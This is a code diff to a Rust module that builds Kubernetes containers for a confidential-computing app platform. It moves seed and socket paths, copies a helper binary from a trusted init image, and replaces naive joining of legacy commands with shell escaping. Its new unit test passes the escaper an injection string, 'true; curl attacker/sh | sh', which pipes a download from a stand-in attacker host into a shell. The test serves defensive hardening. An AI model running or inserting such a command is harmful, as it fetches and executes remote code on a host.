@@ -3,7 +3,7 @@
 //! Phase 5 introduces a fourth container `enclava-init` (Rust replacement for
 //! bootstrap_script.sh) and reshapes app/caddy to drop privileged + shell
 //! interpolation. App/caddy processes start under an argv-preserving
-//! `enclava-wait-exec` helper that must already exist in their images, then
+//! `enclava-wait-exec` helper copied from the trusted enclava-init image, then
 //! `enclava-init` opens LUKS and stays alive as the in-guest bind-mount source.
 //! The legacy bootstrap_script.sh path is still emittable behind the
 //! `LEGACY_BOOTSTRAP_SCRIPT=true` env var so existing pods can be reconciled
@@ -44,12 +44,28 @@ pub fn enclava_init_image() -> String {
     image
 }
 
-pub const ENCLAVA_WAIT_EXEC_PATH: &str = "/usr/local/bin/enclava-wait-exec";
-pub const APP_SEED_PATH: &str = "/run/enclava/seeds/app/seed";
-pub const CADDY_SEED_PATH: &str = "/run/enclava/seeds/caddy/seed";
+pub const ENCLAVA_WAIT_EXEC_PATH: &str = "/enclava-tools/enclava-wait-exec";
+pub const APP_SEED_PATH: &str = "/state/app/seed";
+pub const CADDY_SEED_PATH: &str = "/state/caddy/seed";
 pub const CADDY_ACME_TLS_PORT: i32 = 10443;
 pub const CADDY_INTERNAL_TLS_PORT: i32 = 10443;
 pub const CADDY_INTERNAL_RUNTIME_PATH: &str = "/run/enclava/caddy-runtime";
+pub const UNLOCK_SOCKET_PATH: &str = "/run/enclava-unlock/unlock.sock";
+
+fn shell_escape_arg(arg: &str) -> String {
+    if arg.is_empty() {
+        return "''".to_string();
+    }
+    let escaped = arg.replace('\'', "'\"'\"'");
+    format!("'{escaped}'")
+}
+
+fn shell_escape_argv(args: &[String]) -> String {
+    args.iter()
+        .map(|arg| shell_escape_arg(arg))
+        .collect::<Vec<_>>()
+        .join(" ")
+}
 
 fn ownership_mode_str(mode: UnlockMode) -> &'static str {
     match mode {
@@ -84,7 +100,7 @@ fn env_field_ref(name: &str, field_path: &str) -> EnvVar {
 /// Build the app container.
 ///
 /// Phase 5 default: unprivileged, drops ALL caps, reads its seed from
-/// `/run/enclava/seeds/app/seed` written by the enclava-init sidecar. The user's
+/// `/state/app/seed` written by the enclava-init sidecar. The user's
 /// command is passed as a proper argv list — no `sh -c` interpolation.
 pub fn build_app_container(app: &ConfidentialApp) -> Container {
     let primary = app
@@ -142,7 +158,7 @@ pub fn build_app_container(app: &ConfidentialApp) -> Container {
 
     let (command, args): (Option<Vec<String>>, Option<Vec<String>>) = if legacy {
         let user_cmd = if let Some(ref cmd) = primary.command {
-            cmd.join(" ")
+            shell_escape_argv(cmd)
         } else {
             "/bin/sh -c 'exec /usr/local/bin/app'".to_string()
         };
@@ -183,6 +199,12 @@ pub fn build_app_container(app: &ConfidentialApp) -> Container {
             },
         ]);
     } else {
+        volume_mounts.push(VolumeMount {
+            name: "enclava-tools".to_string(),
+            mount_path: "/enclava-tools".to_string(),
+            read_only: Some(true),
+            ..Default::default()
+        });
         volume_mounts.push(VolumeMount {
             name: "startup".to_string(),
             mount_path: "/startup".to_string(),
@@ -346,6 +368,11 @@ pub fn build_enclava_init_container(app: &ConfidentialApp) -> Container {
                 ..Default::default()
             },
             VolumeMount {
+                name: "unlock-channel".to_string(),
+                mount_path: "/run/enclava-unlock".to_string(),
+                ..Default::default()
+            },
+            VolumeMount {
                 name: "enclava-init-config".to_string(),
                 mount_path: "/etc/enclava-init".to_string(),
                 read_only: Some(true),
@@ -398,6 +425,36 @@ pub fn build_enclava_init_container(app: &ConfidentialApp) -> Container {
     }
 }
 
+pub fn build_enclava_tools_init_container() -> Container {
+    Container {
+        name: "enclava-tools".to_string(),
+        image: Some(enclava_init_image()),
+        command: Some(vec![
+            "/bin/sh".to_string(),
+            "-c".to_string(),
+            "cp /usr/local/bin/enclava-wait-exec /work/enclava-wait-exec && chmod 0555 /work/enclava-wait-exec".to_string(),
+        ]),
+        volume_mounts: Some(vec![VolumeMount {
+            name: "enclava-tools".to_string(),
+            mount_path: "/work".to_string(),
+            ..Default::default()
+        }]),
+        security_context: Some(SecurityContext {
+            allow_privilege_escalation: Some(false),
+            read_only_root_filesystem: Some(true),
+            run_as_non_root: Some(false),
+            run_as_user: Some(0),
+            run_as_group: Some(0),
+            capabilities: Some(Capabilities {
+                add: None,
+                drop: Some(vec!["ALL".to_string()]),
+            }),
+            ..Default::default()
+        }),
+        ..Default::default()
+    }
+}
+
 fn enclava_init_ready_probe() -> Probe {
     Probe {
         exec: Some(ExecAction {
@@ -435,8 +492,8 @@ fn proxy_volume_mounts(legacy: bool) -> Vec<VolumeMount> {
     ];
     if !legacy {
         v.push(VolumeMount {
-            name: "unlock-socket".to_string(),
-            mount_path: "/run/enclava".to_string(),
+            name: "unlock-channel".to_string(),
+            mount_path: "/run/enclava-unlock".to_string(),
             ..Default::default()
         });
     }
@@ -510,10 +567,7 @@ pub fn build_attestation_proxy_container(app: &ConfidentialApp) -> Container {
         env("KBS_FETCH_REQUEST_TIMEOUT_SECONDS", "10"),
     ];
     if !legacy {
-        env_vars.push(env(
-            "ENCLAVA_INIT_UNLOCK_SOCKET",
-            "/run/enclava/unlock.sock",
-        ));
+        env_vars.push(env("ENCLAVA_INIT_UNLOCK_SOCKET", UNLOCK_SOCKET_PATH));
     }
     if let Some(cert) = cc_init_data::trustee_kbs_ca_cert_pem() {
         env_vars.push(env("KBS_RESOURCE_CA_CERT_PEM", &cert));
@@ -571,7 +625,7 @@ pub fn build_attestation_proxy_container(app: &ConfidentialApp) -> Container {
 /// Build the caddy tenant-ingress sidecar container.
 ///
 /// Phase 5 default: unprivileged and listens on a high HTTPS port. Reads
-/// its seed from `/run/enclava/seeds/caddy/seed` and persists Caddy runtime
+/// its seed from `/state/caddy/seed` and persists Caddy runtime
 /// state through an init-managed handoff directory under `/run/enclava`. The Cloudflare
 /// DNS-01 path is gone — Phase 0 cut over to TLS-ALPN-01 — so caddy carries
 /// no `CF_API_TOKEN` env and no `tls-cloudflare-token` secret mount.
@@ -671,6 +725,12 @@ pub fn build_caddy_container(app: &ConfidentialApp) -> Container {
         });
     } else {
         volume_mounts.push(VolumeMount {
+            name: "enclava-tools".to_string(),
+            mount_path: "/enclava-tools".to_string(),
+            read_only: Some(true),
+            ..Default::default()
+        });
+        volume_mounts.push(VolumeMount {
             name: "unlock-socket".to_string(),
             mount_path: "/run/enclava".to_string(),
             ..Default::default()
@@ -757,5 +817,25 @@ pub fn build_caddy_container(app: &ConfidentialApp) -> Container {
             ..Default::default()
         }),
         ..Default::default()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn legacy_shell_escape_quotes_signed_command_args() {
+        let rendered = shell_escape_argv(&[
+            "true; curl attacker/sh | sh".to_string(),
+            "arg with spaces".to_string(),
+            "single'quote".to_string(),
+            "".to_string(),
+        ]);
+
+        assert_eq!(
+            rendered,
+            "'true; curl attacker/sh | sh' 'arg with spaces' 'single'\"'\"'quote' ''"
+        );
     }
 }
